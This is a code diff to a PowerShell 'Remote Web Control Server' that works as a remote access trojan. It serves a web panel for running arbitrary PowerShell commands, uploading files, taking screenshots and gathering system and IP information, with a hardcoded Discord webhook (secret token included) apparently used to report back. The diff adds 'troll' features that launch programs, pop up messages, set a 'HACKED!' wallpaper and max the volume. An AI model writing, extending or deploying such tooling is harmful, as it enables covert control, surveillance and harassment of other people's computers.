@@ -1,5 +1,5 @@
 # Remote Web Control Server
-$webhook = "https://discord.com/api/webhooks/1465800218359496967/VAZpoAAZ8AA0U3-RgERPo1Vp-BIt9sKDTumi_HykhtFZd6IZOZKvrHVIKqPzoTlRIohH"
+$webhook = "https://discord.com/api/webhooks/1462473064397672664/EGBQMFQBUQoXW7tk5frXJlkxFmSDln9vDIaZt4lGTXdzQ0xMyIG9WWpqI-EF7ipRt49O"
 $port = 8080
 
 # Check if running as administrator
@@ -55,10 +55,10 @@ $html = @"
 </head>
 <body>
     <div class="container">
-        <h1>🖥️ Remote Control Panel</h1>
+        <h1>Remote Control Panel</h1>
         
         <div class="section">
-            <h3>💻 Command Terminal</h3>
+            <h3>Command Terminal</h3>
             <form action="/cmd" method="post" id="cmdForm">
                 <input type="text" name="command" placeholder="Enter PowerShell command..." required id="cmdInput">
                 <button type="submit">Execute</button>
@@ -66,7 +66,7 @@ $html = @"
         </div>
 
         <div class="section">
-            <h3>📁 File Manager</h3>
+            <h3>File Manager</h3>
             <form action="/upload" method="post" enctype="multipart/form-data">
                 <div class="file-upload">
                     <input type="file" name="file" required>
@@ -80,15 +80,50 @@ $html = @"
         </div>
 
         <div class="section">
-            <h3>📸 Actions</h3>
+            <h3>Actions</h3>
             <form action="/screenshot" method="post">
-                <button type="submit">📸 Take Screenshot</button>
+                <button type="submit">Take Screenshot</button>
             </form>
             <form action="/info" method="post">
-                <button type="submit">ℹ️ System Info</button>
+                <button type="submit">System Info</button>
             </form>
             <form action="/processes" method="post">
-                <button type="submit">⚙️ List Processes</button>
+                <button type="submit">List Processes</button>
+            </form>
+        </div>
+
+        <div class="section">
+            <h3>Troll Options</h3>
+            <form action="/notepad" method="post">
+                <button type="submit">Open Notepad</button>
+            </form>
+            <form action="/calculator" method="post">
+                <button type="submit">Open Calculator</button>
+            </form>
+            <form action="/paint" method="post">
+                <button type="submit">Open Paint</button>
+            </form>
+            <form action="/cmd" method="post">
+                <button type="submit">Open Command Prompt</button>
+            </form>
+            <form action="/taskmgr" method="post">
+                <button type="submit">Open Task Manager</button>
+            </form>
+            <form action="/explorer" method="post">
+                <button type="submit">Open File Explorer</button>
+            </form>
+            <form action="/browser" method="post">
+                <button type="submit">Open Browser</button>
+            </form>
+            <form action="/message" method="post">
+                <input type="text" name="msgtext" placeholder="Enter message to show..." required>
+                <button type="submit">Show Message Box</button>
+            </form>
+            <form action="/wallpaper" method="post">
+                <button type="submit">Change Wallpaper</button>
+            </form>
+            <form action="/volume" method="post">
+                <button type="submit">Max Volume</button>
             </form>
         </div>
 
@@ -253,6 +288,116 @@ IPs: $($ips -join ', ')
             "/processes" {
                 $processes = Get-Process | Select-Object Name, Id, CPU | ConvertTo-Html -Fragment
                 $outputBuffer += "Running Processes:`n$processes`n"
+                $response.ContentType = "text/html"
+                $buffer = [System.Text.Encoding]::UTF8.GetBytes("<script>window.location.href = '/';</script>")
+                $response.ContentLength64 = $buffer.Length
+                $response.OutputStream.Write($buffer, 0, $buffer.Length)
+            }
+            
+            "/notepad" {
+                Start-Process notepad
+                $outputBuffer += "Notepad opened!`n"
+                $response.ContentType = "text/html"
+                $buffer = [System.Text.Encoding]::UTF8.GetBytes("<script>window.location.href = '/';</script>")
+                $response.ContentLength64 = $buffer.Length
+                $response.OutputStream.Write($buffer, 0, $buffer.Length)
+            }
+            
+            "/calculator" {
+                Start-Process calc
+                $outputBuffer += "Calculator opened!`n"
+                $response.ContentType = "text/html"
+                $buffer = [System.Text.Encoding]::UTF8.GetBytes("<script>window.location.href = '/';</script>")
+                $response.ContentLength64 = $buffer.Length
+                $response.OutputStream.Write($buffer, 0, $buffer.Length)
+            }
+            
+            "/paint" {
+                Start-Process mspaint
+                $outputBuffer += "Paint opened!`n"
+                $response.ContentType = "text/html"
+                $buffer = [System.Text.Encoding]::UTF8.GetBytes("<script>window.location.href = '/';</script>")
+                $response.ContentLength64 = $buffer.Length
+                $response.OutputStream.Write($buffer, 0, $buffer.Length)
+            }
+            
+            "/taskmgr" {
+                Start-Process taskmgr
+                $outputBuffer += "Task Manager opened!`n"
+                $response.ContentType = "text/html"
+                $buffer = [System.Text.Encoding]::UTF8.GetBytes("<script>window.location.href = '/';</script>")
+                $response.ContentLength64 = $buffer.Length
+                $response.OutputStream.Write($buffer, 0, $buffer.Length)
+            }
+            
+            "/explorer" {
+                Start-Process explorer
+                $outputBuffer += "File Explorer opened!`n"
+                $response.ContentType = "text/html"
+                $buffer = [System.Text.Encoding]::UTF8.GetBytes("<script>window.location.href = '/';</script>")
+                $response.ContentLength64 = $buffer.Length
+                $response.OutputStream.Write($buffer, 0, $buffer.Length)
+            }
+            
+            "/browser" {
+                Start-Process chrome -ErrorAction SilentlyContinue
+                if (-not $?) { Start-Process msedge -ErrorAction SilentlyContinue }
+                if (-not $?) { Start-Process firefox -ErrorAction SilentlyContinue }
+                $outputBuffer += "Browser opened!`n"
+                $response.ContentType = "text/html"
+                $buffer = [System.Text.Encoding]::UTF8.GetBytes("<script>window.location.href = '/';</script>")
+                $response.ContentLength64 = $buffer.Length
+                $response.OutputStream.Write($buffer, 0, $buffer.Length)
+            }
+            
+            "/message" {
+                if ($request.HttpMethod -eq "POST") {
+                    $body = New-Object System.IO.StreamReader($request.InputStream).ReadToEnd()
+                    $message = [System.Web.HttpUtility]::UrlDecode($body.Split('=')[1])
+                    Add-Type -AssemblyName System.Windows.Forms
+                    [System.Windows.Forms.MessageBox]::Show($message, "Message", "OK", "Information")
+                    $outputBuffer += "Message box shown: $message`n"
+                }
+                $response.ContentType = "text/html"
+                $buffer = [System.Text.Encoding]::UTF8.GetBytes("<script>window.location.href = '/';</script>")
+                $response.ContentLength64 = $buffer.Length
+                $response.OutputStream.Write($buffer, 0, $buffer.Length)
+            }
+            
+            "/wallpaper" {
+                try {
+                    $wallpaperPath = "$env:TEMP\wallpaper.jpg"
+                    Add-Type -AssemblyName System.Drawing
+                    $bitmap = New-Object System.Drawing.Bitmap(1920, 1080)
+                    $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
+                    $graphics.Clear([System.Drawing.Color]::Red)
+                    $font = New-Object System.Drawing.Font("Arial", 50)
+                    $brush = New-Object System.Drawing.SolidBrush([System.Drawing.Color]::White)
+                    $graphics.DrawString("HACKED!", $font, $brush, 700, 500)
+                    $bitmap.Save($wallpaperPath, [System.Drawing.Imaging.ImageFormat]::Jpeg)
+                    Set-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name "Wallpaper" -Value $wallpaperPath
+                    rundll32.exe user32.dll,UpdatePerUserSystemParameters
+                    $outputBuffer += "Wallpaper changed!`n"
+                } catch {
+                    $outputBuffer += "Failed to change wallpaper: $_`n"
+                }
+                $response.ContentType = "text/html"
+                $buffer = [System.Text.Encoding]::UTF8.GetBytes("<script>window.location.href = '/';</script>")
+                $response.ContentLength64 = $buffer.Length
+                $response.OutputStream.Write($buffer, 0, $buffer.Length)
+            }
+            
+            "/volume" {
+                try {
+                    Add-Type -AssemblyName System.Windows.Forms
+                    for ($i = 0; $i -lt 50; $i++) {
+                        [System.Windows.Forms.SendKeys]::SendWait("{VOLUME_UP}")
+                        Start-Sleep -Milliseconds 50
+                    }
+                    $outputBuffer += "Volume maxed out!`n"
+                } catch {
+                    $outputBuffer += "Failed to change volume: $_`n"
+                }
                 $response.ContentType = "text/html"
                 $buffer = [System.Text.Encoding]::UTF8.GetBytes("<script>window.location.href = '/';</script>")
                 $response.ContentLength64 = $buffer.Length
